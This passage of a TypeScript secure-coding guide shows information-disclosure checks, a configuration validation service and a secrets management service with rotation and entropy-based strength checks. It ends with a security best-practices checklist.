    sanitized = sanitized.replace(/mysql:\/\/[^\s]+/g, '[DB_CONNECTION_REDACTED]');
    
    return sanitized;
  }

  // Check for information disclosure
  checkInformationDisclosure(data: any): DisclosureIssue[] {
    const issues: DisclosureIssue[] = [];
    
    this.scanForDisclosure(data, '', issues);
    
    return issues;
  }

  private scanForDisclosure(data: any, path: string, issues: DisclosureIssue[]): void {
    if (typeof data === 'string') {
      this.checkStringForDisclosure(data, path, issues);
    } else if (typeof data === 'object' && data !== null) {
      Object.keys(data).forEach(key => {
        const currentPath = path ? `${path}.${key}` : key;
        
        if (this.sensitiveFields.has(key.toLowerCase())) {
          issues.push({
            path: currentPath,
            type: 'sensitive_field',
            description: `Sensitive field detected: ${key}`
          });
        }
        
        this.scanForDisclosure(data[key], currentPath, issues);
      });
    }
  }

  private checkStringForDisclosure(value: string, path: string, issues: DisclosureIssue[]): void {
    // Check for stack traces
    if (value.includes('at ') && value.includes('Error:')) {
      issues.push({
        path,
        type: 'stack_trace',
        description: 'Stack trace detected in response'
      });
    }
    
    // Check for database errors
    if (value.includes('SQL') || value.includes('database') || value.includes('connection')) {
      issues.push({
        path,
        type: 'database_error',
        description: 'Database error information detected'
      });
    }
    
    // Check for file system paths
    if (value.includes('/') && value.includes('.')) {
      const pathRegex = /\/[a-zA-Z0-9._-]+\/[a-zA-Z0-9._-]+/g;
      if (pathRegex.test(value)) {
        issues.push({
          path,
          type: 'file_path',
          description: 'File system path detected'
        });
      }
    }
  }

  private sanitizeString(value: string): string {
    // Remove sensitive patterns from strings
    return value
      .replace(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g, '[EMAIL_REDACTED]')
      .replace(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g, '[IP_REDACTED]')
      .replace(/\/[^\s]+/g, match => match.includes('.') ? '[PATH_REDACTED]' : match);
  }
}

interface DisclosureIssue {
  path: string;
  type: 'sensitive_field' | 'stack_trace' | 'database_error' | 'file_path';
  description: string;
}
```

## Secure Configuration Management

### 1. Environment Configuration

**Secure Configuration Service:**
```typescript
class SecureConfigurationService {
  private readonly requiredEnvVars = [
    'NODE_ENV',
    'PORT',
    'DATABASE_URL',
    'JWT_SECRET',
    'ENCRYPTION_KEY'
  ];

  private readonly sensitiveEnvVars = [
    'JWT_SECRET',
    'ENCRYPTION_KEY',
    'DATABASE_PASSWORD',
    'API_KEY',
    'PRIVATE_KEY'
  ];

  constructor() {
    this.validateEnvironment();
    this.validateConfiguration();
  }

  // Validate environment variables
  private validateEnvironment(): void {
    const missing = this.requiredEnvVars.filter(envVar => !process.env[envVar]);
    
    if (missing.length > 0) {
      throw new Error(`Missing required environment variables: ${missing.join(', ')}`);
    }

    // Validate sensitive environment variables
    this.sensitiveEnvVars.forEach(envVar => {
      const value = process.env[envVar];
      if (value && value.length < 32) {
        console.warn(`Warning: ${envVar} should be at least 32 characters long`);
      }
    });
  }

  // Validate configuration values
  private validateConfiguration(): void {
    // Validate port
    const port = parseInt(process.env.PORT || '3000');
    if (port < 1 || port > 65535) {
      throw new Error('Invalid port number');
    }

    // Validate JWT secret strength
    const jwtSecret = process.env.JWT_SECRET;
    if (jwtSecret && jwtSecret.length < 32) {
      throw new Error('JWT secret must be at least 32 characters long');
    }

    // Validate database URL format
    const dbUrl = process.env.DATABASE_URL;
    if (dbUrl && !dbUrl.startsWith('postgresql://') && !dbUrl.startsWith('mysql://')) {
      throw new Error('Invalid database URL format');
    }
  }

  // Get configuration value
  get(key: string): string {
    const value = process.env[key];
    
    if (!value) {
      throw new Error(`Configuration key '${key}' not found`);
    }

    return value;
  }

  // Get configuration with default
  getWithDefault(key: string, defaultValue: string): string {
    return process.env[key] || defaultValue;
  }

  // Get boolean configuration
  getBoolean(key: string, defaultValue: boolean = false): boolean {
    const value = process.env[key];
    if (!value) return defaultValue;
    
    return value.toLowerCase() === 'true' || value === '1';
  }

  // Get number configuration
  getNumber(key: string, defaultValue: number = 0): number {
    const value = process.env[key];
    if (!value) return defaultValue;
    
    const parsed = parseInt(value, 10);
    if (isNaN(parsed)) {
      throw new Error(`Configuration key '${key}' must be a number`);
    }

    return parsed;
  }

  // Get secure configuration (redacted for logging)
  getSecure(key: string): string {
    const value = this.get(key);
    
    if (this.sensitiveEnvVars.includes(key)) {
      return `${value.substring(0, 4)}...[REDACTED]`;
    }

    return value;
  }

  // Validate configuration consistency
  validateConsistency(): void {
    const nodeEnv = process.env.NODE_ENV;
    const isProduction = nodeEnv === 'production';

    // In production, HTTPS should be enforced
    if (isProduction && !process.env.FORCE_HTTPS) {
      console.warn('Warning: FORCE_HTTPS should be enabled in production');
    }

    // In production, debug mode should be disabled
    if (isProduction && process.env.DEBUG) {
      console.warn('Warning: DEBUG should be disabled in production');
    }

    // Database connection should use SSL in production
    const dbUrl = process.env.DATABASE_URL;
    if (isProduction && dbUrl && !dbUrl.includes('ssl=true')) {
      console.warn('Warning: Database connection should use SSL in production');
    }
  }

  // Generate configuration report
  generateReport(): ConfigurationReport {
    const report: ConfigurationReport = {
      environment: process.env.NODE_ENV || 'development',
      timestamp: new Date().toISOString(),
      variables: {},
      security: {
        sensitiveVariables: this.sensitiveEnvVars.length,
        validationPassed: true,
        warnings: []
      }
    };

    // Add non-sensitive variables to report
    Object.keys(process.env).forEach(key => {
      if (!this.sensitiveEnvVars.includes(key)) {
        report.variables[key] = process.env[key];
      }
    });

    // Check for security issues
    this.validateConsistency();

    return report;
  }
}

interface ConfigurationReport {
  environment: string;
  timestamp: string;
  variables: Record<string, string>;
  security: {
    sensitiveVariables: number;
    validationPassed: boolean;
    warnings: string[];
  };
}
```

### 2. Secrets Management

**Secrets Management Service:**
```typescript
class SecretsManagementService {
  private readonly secretsCache = new Map<string, SecretValue>();
  private readonly rotationInterval = 24 * 60 * 60 * 1000; // 24 hours

  // Load secrets from various sources
  async loadSecrets(): Promise<void> {
    // Load from environment variables
    await this.loadFromEnvironment();

    // Load from secure files
    await this.loadFromFiles();

    // Load from external secret management service
    await this.loadFromExternalService();
  }

  private async loadFromEnvironment(): Promise<void> {
    const envSecrets = [
      'JWT_SECRET',
      'ENCRYPTION_KEY',
      'DATABASE_PASSWORD',
      'API_KEY'
    ];

    envSecrets.forEach(secretName => {
      const value = process.env[secretName];
      if (value) {
        this.secretsCache.set(secretName, {
          value,
          source: 'environment',
          loadedAt: new Date(),
          expiresAt: null
        });
      }
    });
  }

  private async loadFromFiles(): Promise<void> {
    const secretFiles = [
      '/etc/secrets/app-secrets.json',
      './secrets/local-secrets.json'
    ];

    for (const filePath of secretFiles) {
      try {
        if (require('fs').existsSync(filePath)) {
          const secrets = JSON.parse(require('fs').readFileSync(filePath, 'utf8'));
          
          Object.entries(secrets).forEach(([name, value]) => {
            this.secretsCache.set(name, {
              value: value as string,
              source: 'file',
              loadedAt: new Date(),
              expiresAt: null
            });
          });
        }
      } catch (error) {
        console.warn(`Failed to load secrets from ${filePath}:`, error.message);
      }
    }
  }

  private async loadFromExternalService(): Promise<void> {
    // Example: AWS Secrets Manager, HashiCorp Vault, etc.
    try {
      // This would be implemented based on your secret management service
      const secrets = await this.fetchFromSecretManager();
      
      Object.entries(secrets).forEach(([name, value]) => {
        this.secretsCache.set(name, {
          value,
          source: 'external',
          loadedAt: new Date(),
          expiresAt: new Date(Date.now() + this.rotationInterval)
        });
      });
    } catch (error) {
      console.warn('Failed to load secrets from external service:', error.message);
    }
  }

  private async fetchFromSecretManager(): Promise<Record<string, string>> {
    // Implementation depends on your secret management service
    return {};
  }

  // Get secret value
  getSecret(name: string): string | null {
    const secret = this.secretsCache.get(name);
    
    if (!secret) {
      console.warn(`Secret '${name}' not found`);
      return null;
    }

    // Check if secret has expired
    if (secret.expiresAt && new Date() > secret.expiresAt) {
      console.warn(`Secret '${name}' has expired`);
      return null;
    }

    return secret.value;
  }

  // Rotate secrets
  async rotateSecrets(): Promise<void> {
    console.log('Starting secret rotation...');
    
    // Generate new secrets
    const newSecrets = await this.generateNewSecrets();
    
    // Update cache
    Object.entries(newSecrets).forEach(([name, value]) => {
      this.secretsCache.set(name, {
        value,
        source: 'rotated',
        loadedAt: new Date(),
        expiresAt: new Date(Date.now() + this.rotationInterval)
      });
    });

    // Notify services about secret rotation
    await this.notifyServices(newSecrets);

    console.log('Secret rotation completed');
  }

  private async generateNewSecrets(): Promise<Record<string, string>> {
    return {
      JWT_SECRET: this.generateSecureSecret(64),
      ENCRYPTION_KEY: this.generateSecureSecret(32),
      API_KEY: this.generateSecureSecret(40)
    };
  }

  private generateSecureSecret(length: number): string {
    const crypto = require('crypto');
    return crypto.randomBytes(length).toString('hex');
  }

  private async notifyServices(newSecrets: Record<string, string>): Promise<void> {
    // Notify other services about secret rotation
    // This could be done via message queue, webhook, etc.
  }

  // Validate secret strength
  validateSecretStrength(name: string, value: string): SecretValidation {
    const validation: SecretValidation = {
      name,
      isValid: true,
      issues: []
    };

    // Check minimum length
    if (value.length < 32) {
      validation.isValid = false;
      validation.issues.push('Secret too short (minimum 32 characters)');
    }

    // Check for common patterns
    if (value.includes('password') || value.includes('secret')) {
      validation.isValid = false;
      validation.issues.push('Secret contains common words');
    }

    // Check for repeated characters
    if (/(.)\1{3,}/.test(value)) {
      validation.isValid = false;
      validation.issues.push('Secret contains repeated characters');
    }

    // Check entropy
    const entropy = this.calculateEntropy(value);
    if (entropy < 4) {
      validation.isValid = false;
      validation.issues.push('Secret has low entropy');
    }

    return validation;
  }

  private calculateEntropy(str: string): number {
    const chars = {};
    for (let i = 0; i < str.length; i++) {
      chars[str.charAt(i)] = (chars[str.charAt(i)] || 0) + 1;
    }

    let entropy = 0;
    for (const key in chars) {
      const probability = chars[key] / str.length;
      entropy -= probability * Math.log2(probability);
    }

    return entropy;
  }

  // Generate secrets report
  generateSecretsReport(): SecretsReport {
    const report: SecretsReport = {
      totalSecrets: this.secretsCache.size,
      secrets: [],
      validation: {
        passed: 0,
        failed: 0,
        issues: []
      },
      rotation: {
        nextRotation: new Date(Date.now() + this.rotationInterval),
        lastRotation: null
      }
    };

    this.secretsCache.forEach((secret, name) => {
      const validation = this.validateSecretStrength(name, secret.value);
      
      report.secrets.push({
        name,
        source: secret.source,
        loadedAt: secret.loadedAt,
        expiresAt: secret.expiresAt,
        validation
      });

      if (validation.isValid) {
        report.validation.passed++;
      } else {
        report.validation.failed++;
        report.validation.issues.push(...validation.issues);
      }
    });

    return report;
  }
}

interface SecretValue {
  value: string;
  source: 'environment' | 'file' | 'external' | 'rotated';
  loadedAt: Date;
  expiresAt: Date | null;
}

interface SecretValidation {
  name: string;
  isValid: boolean;
  issues: string[];
}

interface SecretsReport {
  totalSecrets: number;
  secrets: Array<{
    name: string;
    source: string;
    loadedAt: Date;
    expiresAt: Date | null;
    validation: SecretValidation;
  }>;
  validation: {
    passed: number;
    failed: number;
    issues: string[];
  };
  rotation: {
    nextRotation: Date;
    lastRotation: Date | null;
  };
}
```

## Best Practices Summary

### 1. Dependency Security
- Regularly audit dependencies for vulnerabilities
- Use allowlists for approved packages
- Verify package integrity with checksums
- Implement supply chain security measures
- Keep dependencies up to date

### 2. Code Review Security
- Implement automated security scanning
- Use comprehensive security checklists
- Review for common vulnerability patterns
- Validate input validation and sanitization
- Check authentication and authorization

### 3. Security Testing
- Implement automated security tests
- Test for common attack vectors
- Validate error handling security
- Test authentication and authorization
- Perform penetration testing

### 4. Error Handling
- Never expose sensitive information in errors
- Use generic error messages for users
- Log detailed errors securely
- Implement graceful degradation
- Prevent information disclosure

### 5. Configuration Security
- Use environment variables for secrets
- Validate configuration values
- Implement secure defaults
- Regularly review configuration
- Monitor for configuration drift

### 6. Security Checklist
- [ ] Dependencies are regularly audited
- [ ] Security code reviews are performed
- [ ] Automated security tests are implemented
- [ ] Error handling prevents information disclosure
- [ ] Configuration is validated and secured
- [ ] Secrets are managed securely
- [ ] Security monitoring is implemented
- [ ] Incident response plan is in place
- [ ] Security training is provided to developers
- [ ] Regular security assessments are conducted

Remember: Security is a continuous process. Regularly review and update your security practices to stay ahead of emerging threats and vulnerabilities.